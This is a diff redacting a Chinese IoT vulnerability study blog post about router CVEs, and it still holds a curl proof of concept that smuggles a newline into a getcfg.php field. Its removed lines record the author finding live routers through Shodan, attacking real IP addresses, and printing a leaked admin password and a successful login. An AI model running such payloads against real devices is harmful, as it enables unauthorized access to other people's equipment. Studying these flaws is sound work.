@@ -59,7 +59,7 @@
     "keywords": ["IoT"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "13430"
+    "wordCount": "13389"
   }]
   </script>
 <meta content="ta0lve" name="author"/>
@@ -259,7 +259,7 @@
     </h1>
 <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
 <div class="flex flex-row flex-wrap items-center">
-<time datetime="2024-02-22 00:00:00 +0000 UTC">February 22, 2024</time><span class="px-2 text-primary-500">·</span><time datetime="2024-02-23 00:00:00 +0000 UTC"></time><span class="px-2 text-primary-500">·</span><span>13430 字</span><span class="px-2 text-primary-500">·</span><span title="预计阅读">27 分钟</span>
+<time datetime="2024-02-22 00:00:00 +0000 UTC">February 22, 2024</time><span class="px-2 text-primary-500">·</span><time datetime="2024-02-23 00:00:00 +0000 UTC"></time><span class="px-2 text-primary-500">·</span><span>13389 字</span><span class="px-2 text-primary-500">·</span><span title="预计阅读">27 分钟</span>
 </div>
 <div class="flex flex-row flex-wrap items-center">
 <span class="mr-2" onclick="window.open(&quot;/categories/iot%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&quot;,'_self');" style="margin-top:0.5rem">
@@ -616,7 +616,7 @@
 <svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M506.3 417l-213.3-364c-16.33-28-57.54-28-73.98 0l-213.2 364C-10.59 444.9 9.849 480 42.74 480h426.6C502.1 480 522.6 445 506.3 417zM232 168c0-13.25 10.75-24 24-24S280 154.8 280 168v128c0 13.25-10.75 24-23.1 24S232 309.3 232 296V168zM256 416c-17.36 0-31.44-14.08-31.44-31.44c0-17.36 14.07-31.44 31.44-31.44s31.44 14.08 31.44 31.44C287.4 401.9 273.4 416 256 416z" fill="currentColor"></path></svg>
 </span>
 </span>
-<span class="dark:text-neutral-300"><strong>如果本博客部分文章图片加载失败，</strong><a href="https://ta0lve.github.io/posts/sth/sm.ms/" target="_blank">
+<span class="dark:text-neutral-300"><strong>如果本博客部分文章图片加载失败，</strong><a href="/posts/sth/sm.ms/">
 <strong>可以点击此处查看解决办法</strong></a></span>
 </div>
 <p>漏洞基本信息格式：</p>
@@ -843,27 +843,9 @@
 <a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0" style="text-decoration-line: none !important;">#</a></span>
 </h4>
 <p>由于该设备我们<code>qemu</code>模拟的环境中是无法连接上的，由于之后还要发送数据，这里也不好直接<code>patch</code>，因此，在本地较难复现</p>
-<p>使用 <code>shodan</code>（ <a href="https://www.shodan.io/" target="_blank">
-    https://www.shodan.io/</a> ） 查找到还在用此路由器设备的站点</p>
-<p><a href="https://www.shodan.io/search?query=GT-AC2900" target="_blank">
-    GT-AC2900 - Shodan Search</a></p>
-<p>
-<figure>
-<img alt="image-20240222171303461" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/lycS163ghGQPxXV.png"/>
-</figure>
-</p>
-<p>
-<figure>
-<img alt="image-20240222172743878" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/wuSID93FBveysZt.png"/>
-</figure>
-</p>
-<p>
-<figure>
-<img alt="image-20240224142050552" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/W3spGErODd2Jiuf.png"/>
-</figure>
-</p>
-<p>存在还在用此路由器设备的站点，但由于这些站点都已经升级为了新固件版本，所以poc没有打通</p>
-<p>该漏洞暂时没有成功复现</p>
+<p><del>使用 <code>shodan</code>（ <a href="https://www.shodan.io/" target="_blank">
+    https://www.shodan.io/</a> ） 查找到还在用此路由器设备的站点</del></p>
+<p>可以复现漏洞，但是这样做不太好（）</p>
 <div class="anchor" id="cve-2021-20090"></div>
 <h3 class="relative group">CVE-2021-20090 
     <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
@@ -1244,25 +1226,21 @@
 <a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-1" style="text-decoration-line: none !important;">#</a></span>
 </h4>
 <p>由于该设备我们<code>qemu</code>模拟的环境中是无法连接上的，由于之后还要发送数据，这里也不好直接<code>patch</code>，因此，在本地较难复现</p>
-<p>使用 <code>shodan</code>（ <a href="https://www.shodan.io/search?query=tew-751dr" target="_blank">
-    https://www.shodan.io/search?query=tew-751dr</a> ） 查找到还在用表格中路由器设备的站点</p>
-<p>使用<code>zoomeye</code>（https://www.zoomeye.org/discover）来查找也可以</p>
-<p>部分还在用表格中型号路由器设备的站点，可能因为已经升级为了新固件版本，所以poc没有打通</p>
-<p>经过几次尝试，访问<code>http://165.22.61.91/images/../apply_abstract.cgi</code>时</p>
-<p>会直接跳转到<code>http://165.22.61.91/apply_abstract.cgi</code></p>
-<p>然后弹出身份验证提示</p>
-<p>
-<figure>
-<img alt="image-20240222181734797" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/2SBLZcUQqJetxCg.png"/>
-</figure>
-</p>
-<p>点击取消之后可以发现已经开始下载apply_abstract.cgi文件了</p>
+<p><del>使用 <code>shodan</code>（ <a href="https://www.shodan.io/search?query=tew-751dr" target="_blank">
+    https://www.shodan.io/search?query=tew-751dr</a> ） 查找到还在用表格中路由器设备的站点</del></p>
+<p><del>使用<code>zoomeye</code>（https://www.zoomeye.org/discover）来查找也可以</del></p>
+<p><del>部分还在用表格中型号路由器设备的站点，可能因为已经升级为了新固件版本，所以poc没有打通</del></p>
+<p><del>经过几次尝试，访问<code>http://某ip/images/../apply_abstract.cgi</code>时</del></p>
+<p><del>会直接跳转到<code>http://某ip/apply_abstract.cgi</code></del></p>
+<p><del>然后弹出身份验证提示</del></p>
+<p><del>点击取消之后可以发现已经开始下载apply_abstract.cgi文件了</del></p>
 <p>
 <figure>
 <img alt="image-20240224140231882" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/d3tFOyfz9Hgk6SX.png"/>
 </figure>
 </p>
-<p>漏洞复现成功</p>
+<p><del>漏洞复现成功</del></p>
+<p>可以复现漏洞，但是这样做不太好（）</p>
 <div class="anchor" id="d-link友讯"></div>
 <h2 class="relative group">D-Link(友讯) 
     <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
@@ -2632,62 +2610,13 @@
     <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
 <a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-4" style="text-decoration-line: none !important;">#</a></span>
 </h4>
-<p>这里在我们<code>qemu</code>模拟的环境中是无法连接上的，由于之后还要发送数据，这里也不好直接<code>patch</code>掉，因此，在本地是不好复现的，不过，我们可以打远程。</p>
-<p>使用 <code>shodan</code>（ <a href="https://www.shodan.io/search?query=tew-751dr" target="_blank">
-    https://www.shodan.io/search?query=tew-751dr</a> ） 查找到还在用此路由器设备的站点</p>
-<p>我们用<code>POC</code>：</p>
-<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">curl -d <span class="s2">"SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1"</span> <span class="s2">"http://[ip]/getcfg.php"</span>
-</span></span></code></pre></div><p>随便找一个打一下</p>
-<ul>
-<li>185.61.89.119</li>
-</ul>
-<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">curl -d <span class="s2">"SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1"</span> <span class="s2">"http://174.104.16.176:8080/getcfg.php"</span>
-</span></span></code></pre></div><p>
-<figure>
-<img alt="image-20240129011556406" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/8tHwBY7J4pvzcei.png"/>
-</figure>
-</p>
-<ul>
-<li>
-<p><a href="http://174.104.16.176:8080/" target="_blank">
-    TRENDNET | WIRELESS N ROUTER</a></p>
-</li>
-<li>
-<p>http://174.104.16.176:8080/</p>
-</li>
-</ul>
-<p>打payload:</p>
-<p>
-<figure>
-<img alt="image-20240129011735923" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/DcXTBQ9dhKovjH6.png"/>
-</figure>
-</p>
-<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl">			<span class="o">&lt;</span><span class="nx">entry</span><span class="o">&gt;</span>
-</span></span><span class="line"><span class="cl">				<span class="o">&lt;</span><span class="nx">uid</span><span class="o">&gt;&lt;</span><span class="err">/uid&gt;</span>
-</span></span><span class="line"><span class="cl">				<span class="o">&lt;</span><span class="nx">name</span><span class="o">&gt;</span><span class="nx">admin</span><span class="o">&lt;</span><span class="err">/name&gt;</span>
-</span></span><span class="line"><span class="cl">				<span class="o">&lt;</span><span class="nx">usrid</span><span class="o">&gt;&lt;</span><span class="err">/usrid&gt;</span>
-</span></span><span class="line"><span class="cl">				<span class="o">&lt;</span><span class="nx">password</span><span class="o">&gt;</span><span class="nx">HE0PJTX</span><span class="o">%&lt;</span><span class="err">/password&gt;</span>
-</span></span><span class="line"><span class="cl">				<span class="o">&lt;</span><span class="nx">group</span><span class="o">&gt;</span><span class="mi">0</span><span class="o">&lt;</span><span class="err">/group&gt;</span>
-</span></span><span class="line"><span class="cl">				<span class="o">&lt;</span><span class="nx">description</span><span class="o">&gt;&lt;</span><span class="err">/description&gt;</span>
-</span></span><span class="line"><span class="cl">			<span class="o">&lt;</span><span class="err">/entry&gt;</span>
-</span></span></code></pre></div><p>
-<figure>
-<img alt="image-20240129011823931" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/ncEhGXJSjWOyTPi.png"/>
-</figure>
-</p>
-<p>成功登录：</p>
-<p>
-<figure>
-<img alt="image-20240129011846165" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/JPQO3aDyh4pM7ue.png"/>
-</figure>
-</p>
-<p>捕获整页：</p>
-<p>
-<figure>
-<img alt="image-20240129011905924" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/YClUWpBk4nZOsif.png"/>
-</figure>
-</p>
-<div class="anchor" id="huawei"></div>
+<p>这里在我们<code>qemu</code>模拟的环境中是无法连接上的，由于之后还要发送数据，这里也不好直接<code>patch</code>掉，因此，在本地是不好复现的，<del>不过，我们可以打远程。</del></p>
+<p><del>使用 <code>shodan</code>（ <a href="https://www.shodan.io/search?query=tew-751dr" target="_blank">
+    https://www.shodan.io/search?query=tew-751dr</a> ） 查找到还在用此路由器设备的站点</del></p>
+<p>可以复现漏洞，但是这样的行为不太好（）</p>
+<p><code>POC</code>如下：</p>
+<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">curl -d <span class="s2">"SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1"</span> <span class="s2">"http://某ip/getcfg.php"</span>
+</span></span></code></pre></div><div class="anchor" id="huawei"></div>
 <h2 class="relative group">HUAWEI 
     <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
 <a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#huawei" style="text-decoration-line: none !important;">#</a></span>
@@ -2980,7 +2909,7 @@
 <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral" href="/posts/iot/0x01/">IoT基础学习</div>
 <div class="text-sm text-neutral-500 dark:text-neutral-400">
 <div class="flex flex-row flex-wrap items-center">
-<time datetime="2024-02-21 00:00:00 +0000 UTC">February 21, 2024</time><span class="px-2 text-primary-500">·</span><time datetime="2024-02-23 00:00:00 +0000 UTC"></time><span class="px-2 text-primary-500">·</span><span>6297 字</span><span class="px-2 text-primary-500">·</span><span title="预计阅读">13 分钟</span>
+<time datetime="2024-02-21 00:00:00 +0000 UTC">February 21, 2024</time><span class="px-2 text-primary-500">·</span><time datetime="2024-02-23 00:00:00 +0000 UTC"></time><span class="px-2 text-primary-500">·</span><span>6165 字</span><span class="px-2 text-primary-500">·</span><span title="预计阅读">13 分钟</span>
 </div>
 <div class="flex flex-row flex-wrap items-center">
 <span class="mr-2" onclick="window.open(&quot;/categories/iot%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&quot;,'_self');" style="margin-top:0.5rem">
